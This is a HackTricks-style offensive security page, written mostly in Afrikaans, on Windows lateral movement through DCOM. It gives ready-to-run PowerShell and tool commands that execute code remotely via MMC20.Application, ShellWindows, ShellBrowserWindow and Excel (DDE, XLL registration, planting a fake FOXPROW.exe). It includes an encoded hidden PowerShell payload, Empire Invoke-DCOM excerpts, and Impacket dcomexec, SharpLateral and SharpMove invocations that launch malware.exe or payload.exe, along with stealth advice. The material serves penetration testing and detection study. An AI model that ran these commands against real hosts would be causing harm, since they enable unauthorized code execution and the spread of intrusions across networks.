# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM laterale beweging is aantreklik omdat dit bestaande COM servers hergebruik wat oor RPC/DCOM blootgestel is, in plaas daarvan om ’n diens of geskeduleerde taak te skep. In die praktyk beteken dit dat die aanvanklike verbinding gewoonlik op TCP/135 begin en dan na dinamies toegekende hoë RPC-poorte beweeg.

## Vereistes & Probleempunte

- Jy benodig gewoonlik ’n plaaslike administrateur-konteks op die teiken en die remote COM server moet remote launch/activation toelaat.
- Sedert **14 Maart 2023** dwing Microsoft DCOM hardening af vir ondersteunde stelsels. Ou clients wat ’n lae activation authentication level aanvra, kan faal tensy hulle ten minste `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` onderhandel. Moderne Windows clients word gewoonlik outomaties opgegradeer, so huidige tooling werk normaalweg steeds.
- Handmatige of geskriptte DCOM-uitvoering benodig gewoonlik TCP/135 plus die teiken se dinamiese RPC-poortreeks. As jy Impacket se `dcomexec.py` gebruik en jy wil command output terug hê, benodig jy gewoonlik ook SMB-toegang tot `ADMIN$` (of ’n ander skryfbare/leesbare share).
- As RPC/DCOM werk maar SMB is geblokkeer, kan `dcomexec.py -nooutput` steeds nuttig wees vir blind execution.

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Vir meer inligting oor hierdie tegniek, kyk na die oorspronklike plasing van [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Distributed Component Object Model (DCOM)-objekte bied ’n interessante vermoë vir netwerkgebaseerde interaksies met objekte. Microsoft verskaf omvattende dokumentasie vir beide DCOM en Component Object Model (COM), toeganklik [hier vir DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) en [hier vir COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). ’n Lys van DCOM-toepassings kan met die PowerShell-opdrag herwin word:
```bash
Get-CimInstance Win32_DCOMApplication
```
Die COM-objek, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), maak scripting van MMC snap-in-bedrywighede moontlik. Hierdie objek bevat veral 'n `ExecuteShellCommand`-metode onder `Document.ActiveView`. Meer inligting oor hierdie metode kan [hier](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) gevind word. Kyk hoe dit loop:

Hierdie funksie vergemaklik die uitvoering van opdragte oor 'n netwerk via 'n DCOM-toepassing. Om op afstand as 'n admin met DCOM te interaksieer, kan PowerShell soos volg gebruik word:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Hierdie opdrag koppel aan die DCOM-toepassing en gee 'n instansie van die COM-objek terug. Die ExecuteShellCommand-metode kan dan geroep word om 'n proses op die afgeleë gasheer uit te voer. Die proses behels die volgende stappe:

Kontroleer metodes:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Kry RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
The last argument is the vensterstyl. `7` hou die venster geminimaliseer. Operasioneel lei MMC-gebaseerde uitvoering gewoonlik daartoe dat ’n afgeleë `mmc.exe`-proses jou payload spawn, wat anders is as die Explorer-ondersteunde objects hieronder.

## ShellWindows & ShellBrowserWindow

**For more info about this technique check the original post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Die **MMC20.Application** object is geïdentifiseer as ontbrekende eksplisiete "LaunchPermissions," en val terug op permissions wat Administrators toegang toelaat. Vir verdere besonderhede kan ’n thread [hier](https://twitter.com/tiraniddo/status/817532039771525120) nagegaan word, en die gebruik van [@tiraniddo](https://twitter.com/tiraniddo) se OleView .NET vir filtering van objects sonder eksplisiete Launch Permission word aanbeveel.

Twee spesifieke objects, `ShellBrowserWindow` en `ShellWindows`, is uitgelig weens hul gebrek aan eksplisiete Launch Permissions. Die afwesigheid van ’n `LaunchPermission` registry entry onder `HKCR:\AppID\{guid}` dui op geen eksplisiete permissions nie.

In vergelyking met `MMC20.Application` is hierdie objects dikwels stiller vanuit ’n OPSEC-perspektief omdat die command gewoonlik as ’n child van `explorer.exe` op die remote host eindig in plaas van `mmc.exe`.

### ShellWindows

Vir `ShellWindows`, wat geen ProgID het nie, maak die .NET methods `Type.GetTypeFromCLSID` en `Activator.CreateInstance` object instantiation moontlik deur gebruik te maak van sy AppID. Hierdie proses gebruik OleView .NET om die CLSID vir `ShellWindows` te verkry. Sodra dit geïnstantieer is, is interaksie moontlik deur die `WindowsShell.Item` method, wat lei tot method invocation soos `Document.Application.ShellExecute`.

Voorbeeld PowerShell commands is verskaf om die object te instansieer en commands op afstand uit te voer:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` is soortgelyk, maar jy kan dit direk via sy CLSID instansieer en na `Document.Application.ShellExecute` pivot:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Laterale Beweging met Excel DCOM Objects

Laterale beweging kan bereik word deur DCOM Excel objects uit te buit. Vir gedetailleerde inligting, is dit raadsaam om die bespreking oor die benutting van Excel DDE vir laterale beweging via DCOM by [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) te lees.

Die Empire project bied ’n PowerShell script, wat die gebruik van Excel vir remote code execution (RCE) demonstreer deur DCOM objects te manipuleer. Hieronder is uittreksels uit die script beskikbaar by [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), wat verskillende metodes toon om Excel vir RCE te misbruik:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Onlangse navorsing het hierdie area uitgebrei met `Excel.Application` se `ActivateMicrosoftApp()`-metode. Die sleutelfeet is dat Excel kan probeer om ouer Microsoft-toepassings soos FoxPro, Schedule Plus, of Project te begin deur die stelsel se `PATH` te soek. As ’n operateur ’n payload met een van daardie verwagte name in ’n skryfbare ligging kan plaas wat deel van die teiken se `PATH` is, sal Excel dit uitvoer.

Vereistes vir hierdie variasie:

- Local admin op die teiken
- Excel op die teiken geïnstalleer
- Vermoë om ’n payload na ’n skryfbare directory in die teiken se `PATH` te skryf

Praktiese voorbeeld wat die FoxPro lookup misbruik (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
As die aanvallende gasheer nie die plaaslike `Excel.Application` ProgID geregistreer het nie, instansieer die afgeleë objek eerder deur CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Waardes wat in die praktyk misbruik word:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Outomatiseringsgereedskap vir Laterale Beweging

Twee gereedskap word uitgelig om hierdie tegnieke te outomatiseer:

- **Invoke-DCOM.ps1**: ’n PowerShell-skrip wat deur die Empire-projek voorsien word en wat die aanroep van verskillende metodes vir die uitvoer van kode op afgeleë masjiene vereenvoudig. Hierdie skrip is beskikbaar by die Empire GitHub-bewaarplek.

- **SharpLateral**: ’n Gereedskap wat ontwerp is vir die afgeleë uitvoer van kode, wat gebruik kan word met die opdrag:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Outomatiese Gereedskap

- Die Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) laat jou maklik toe om al die gekommenteerde maniere te gebruik om kode op ander masjiene uit te voer.
- Jy kan Impacket se `dcomexec.py` gebruik om opdragte op afgeleë stelsels uit te voer met DCOM. Huidige builds ondersteun `ShellWindows`, `ShellBrowserWindow`, en `MMC20`, en verstek na `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Jy kan ook [**SharpLateral**](https://github.com/mertdas/SharpLateral) gebruik:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Jy kan ook [**SharpMove**](https://github.com/0xthirteen/SharpMove) gebruik
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Verwysings

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
